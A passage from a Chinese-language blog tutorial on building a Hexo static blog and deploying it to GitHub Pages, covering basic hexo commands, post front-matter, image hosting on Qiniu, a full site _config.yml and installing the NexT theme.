部署到Github，可以简化为hexo d</span></span><br></pre></td></tr></table></figure><p>浏览器访问<code>loveNight.github.io</code>就能看到自己的Blog了，一般延迟十分钟左右才能看到效果。一开始看到404页面不要惊慌，耐心等等。</p><p>手打党请注意，配置文件的冒号后必须有一个空格。</p><p>如果报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Deployer not found:git</span><br></pre></td></tr></table></figure><p>运行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h4 id="hexo使用"><a href="#hexo使用" class="headerlink" title="hexo使用"></a>hexo使用</h4><h5 id="生成静态页面"><a href="#生成静态页面" class="headerlink" title="生成静态页面"></a>生成静态页面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure><h5 id="本地启动"><a href="#本地启动" class="headerlink" title="本地启动"></a>本地启动</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>浏览器输入<code>localhost:4000</code>就可以看到效果。当你修改了文章或配置文件时，保存文件再刷新浏览器就能看到修改后的效果，非常方便。</p><h5 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post &quot;title&quot;  # 生成新文章：\source\_posts\title.md，可省略post</span><br></pre></td></tr></table></figure><h5 id="新建页面"><a href="#新建页面" class="headerlink" title="新建页面"></a>新建页面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;title&quot;</span><br></pre></td></tr></table></figure><p>post、page等可以改成其他layout，可用layout在scaffolds目录下查看。在同目录下创建文件来添加自己的layout，也可以编辑现有的layout，比如post的layout默认是<code>\scaffolds\post.md</code>。</p><h5 id="编辑文章"><a href="#编辑文章" class="headerlink" title="编辑文章"></a>编辑文章</h5><p>打开新建的文章<code>\source\_posts\postName.md</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">title: HelloWorld！ # 文章页面上的显示名称，可以任意修改，不会出现在URL中</span><br><span class="line">date: 2015-11-09 15:56:26 # 文章生成时间，一般不改</span><br><span class="line">categories:   # 文章分类目录，参数可省略</span><br><span class="line">    - 随笔</span><br><span class="line">    - 瞬间</span><br><span class="line">tags:   # 文章标签，参数可省略</span><br><span class="line">    - hexo</span><br><span class="line">    - blog # 个数不限，单个可直接跟在tags后面</span><br><span class="line">---</span><br><span class="line">这里开始使用markdown格式输入你的正文。</span><br></pre></td></tr></table></figure><p>多级分类语法格式：（标签也可以用类似的写法）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 第一种</span><br><span class="line">categories:</span><br><span class="line">  - 一级分类</span><br><span class="line">  - 二级分类</span><br><span class="line">  - etc...</span><br><span class="line"></span><br><span class="line"># 第二种：</span><br><span class="line">categories: [一级分类, 二级分类]</span><br></pre></td></tr></table></figure><p>首页文章预览添加图片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">photos:</span><br><span class="line">  - http://xxx.com/photo1.jpg</span><br><span class="line">  - http://xxx.com/photo2.jpg</span><br></pre></td></tr></table></figure><p>正文中可以使用<code></code>设置文章摘要 如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">以上显示在摘要中</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">以下是余下全文</span><br></pre></td></tr></table></figure><p>more 以上内容即是文章摘要，如果设置了主页只显示摘要，则more以下内容点击 <code>Read More</code> 链接打开全文才显示。</p><h5 id="简单命令"><a href="#简单命令" class="headerlink" title="简单命令"></a>简单命令</h5><p>hexo现在支持更加简单的命令格式了，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo g == hexo generate # 生成</span><br><span class="line">hexo d == hexo deploy # 部署 # 可与hexo g合并为 hexo d -g</span><br><span class="line">hexo s == hexo server # 本地预览</span><br><span class="line">hexo n == hexo new # 写文章</span><br></pre></td></tr></table></figure><h5 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h5><p>博客中的图片文件可以直接放在source文件夹下，部署时上传到Github仓库中。但是Github项目容量有限，而且主机在国外，访问速度较慢，把图片放在国内的图床上是个更好的选择。我用的是<a href="https://portal.qiniu.com/signup?code=3lgo2c4fgwv9u" target="_blank" rel="noopener">七牛云存储</a></p><p>免费用户实名审核之后，可以获取10GB永久免费存储空间、每月10GB下载流量、每月10万次Put请求、每月100万次Get请求，做图床绰绰有余。</p><p>注册账号，新建空间，我的新空间名是<code>blog</code>，专门用来放置博客上引用的资源。</p><p>进入空间后点击「内容管理」，再点击「上传」：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/hexo-1.png" alt="1"></p><p>七牛空间没有文件夹的概念，但是允许为文件添加带斜杠<code>/</code>的前缀，用来给资源分类。这里我设置前缀为<code>img/Hexo 3.1.1 静态博客搭建指南/</code>。上传了一张图片,在右侧可以找到外链，复制地址：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/hexo-2.png" alt="2"></p><p>Markdown 插入图片的语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](图片网址)</span><br></pre></td></tr></table></figure><p>上传图片 -&gt; 获取外链 -&gt; 写入Markdown，就这么简单！</p><p>由于七牛防盗链的白名单无法添加<code>localhost</code>，暂时不设置防盗链，否则<code>hexo s</code>调试的时候，看不到图片。</p><h4 id="配置博客"><a href="#配置博客" class="headerlink" title="配置博客"></a>配置博客</h4><h5 id="全站配置"><a href="#全站配置" class="headerlink" title="全站配置"></a>全站配置</h5><p><strong>注意：文件中配置项的冒号后面必须加空格，否则报错</strong></p><p>下面有些选项要配置后文的插件才有效，文件中已注明。</p><ul><li><strong>整站的配置</strong>：博客根目录下的<code>\_config.yml</code>文件。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: http://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">ZEROYU</span> <span class="comment"># 站点名</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="comment"># 副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">一只单线程HACKER</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">ZEROYU</span> <span class="comment"># 作者，在站点左下角可以看到</span></span><br><span class="line"><span class="comment">#avatar: /images/avatar.jpg # 头像。Next主题增加的字段</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span> <span class="comment"># 语言。Next主题增加的字段</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line"><span class="attr">since:</span> <span class="number">2015</span> <span class="comment"># 博客建立年份，Next主题增加的字段</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多说 ShortName</span></span><br><span class="line"><span class="attr">duoshuo_shortname:</span>  <span class="comment"># xxx.duoshuo.com，xxx即是shortname。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Social links</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line"><span class="attr">  Github:</span> <span class="attr">https://github.com/zer0yu</span></span><br><span class="line"><span class="attr">  Weibo:</span> <span class="attr">http://weibo.com/Z3r0yu</span></span><br><span class="line"><span class="attr">  Email:</span> <span class="string">zeroyu.xyz@gmail.com</span></span><br><span class="line">  <span class="comment"># zhihu: http://www.zhihu.com/people/your-user-name</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># title, chinese available</span></span><br><span class="line"><span class="attr">links_title:</span> <span class="string">友情链接</span></span><br><span class="line"><span class="comment"># links</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="string">我的CSDN博客:</span> <span class="attr">http://blog.csdn.net/zeroyu_xyz</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class="line"><span class="attr">url:</span> <span class="attr">http://zer0yu.github.io/</span> <span class="comment"># 网址</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span>  <span class="comment"># 国际化文件夹</span></span><br><span class="line"><span class="attr">skip_render:</span>   <span class="comment"># 跳过指定文件的渲染</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing # 文章布局、写作格式的定义</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">external_link:</span> <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span>   <span class="comment"># 1 为小写， 2 为大写</span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span>  <span class="comment"># 显示草稿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span>  <span class="comment"># 启动asset文件夹</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span> <span class="comment"># 链接改为与根目录的相对地址</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span>  <span class="comment"># 显示未来的文章</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  line_number:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  auto_detect:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  tab_replace:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="attr">HH:mm:ss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination # 每页显示文章数</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions # 这里配置站点所用主题和插件</span></span><br><span class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="attr">plugins:</span></span><br><span class="line"><span class="attr">baidusitemap:</span> <span class="comment"># 需要安装插件 npm install hexo-generator-baidu-sitemap@0.1.1 --save</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">baidusitemap.xml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: http://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br><span class="line"></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line"><span class="attr">  type:</span> <span class="string">atom</span>       <span class="comment">#feed 类型 (atom/rss2)</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">atom.xml</span>   <span class="comment">#rss 路径</span></span><br><span class="line"><span class="attr">  limit:</span> <span class="number">0</span>        <span class="comment">#在 rss 中最多生成的文章数(0显示所有)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义站点内容搜索</span></span><br><span class="line"><span class="comment"># 需要先安装插件：</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-search --save</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">search.xml</span></span><br><span class="line"><span class="attr">  field:</span> <span class="string">all</span>  <span class="comment"># 如只想索引文章，可设置为post</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment # 站点部署到github</span></span><br><span class="line"><span class="comment">## Docs: http://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">  type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">  repository:</span> <span class="string">git@github.com:zer0yu/zer0yu.github.io.git</span></span><br><span class="line"><span class="attr">  branch:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------下面选项需要对应插件的支持---------------</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-index --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-archive --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-category --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-tag --save</span></span><br><span class="line"></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">##首页默认10篇文章标题 如果值为0不分页</span></span><br><span class="line"></span><br><span class="line"><span class="attr">archive_generator:</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="number">20</span> <span class="comment">##归档页面默认20篇文章标题</span></span><br><span class="line"><span class="attr">  yearly:</span> <span class="literal">true</span>  <span class="comment">##生成年视图</span></span><br><span class="line"><span class="attr">  monthly:</span> <span class="literal">true</span> <span class="comment">##生成月视图</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tag_generator:</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">##标签分类页面默认10篇文章</span></span><br><span class="line"></span><br><span class="line"><span class="attr">category_generator:</span></span><br><span class="line"><span class="attr">  per_page:</span> <span class="number">10</span> <span class="comment">###分类页面默认10篇文章</span></span><br></pre></td></tr></table></figure><h4 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h4><p>默认主题太丑，换成<a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">NexT</a>主题。</p><ul><li>安装：在博客根目录下执行<code>git clone https://github.com/iissnan/hexo-theme-next.git themes/next</code>。</li><li>启用：修改博客根目录下的<code>_config.yml</code>配置文件中的<code>theme</code>属性，将其设置为<code>next</code>。</li><li>更新：在<code>themes/next</code>目录下执行<code>git pull</code>。（暂时不需要）</li><li><code>\themes\next\_config.yml</code>修改主题配置。</li></ul><p>我的<code>_config.yml</code>文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span 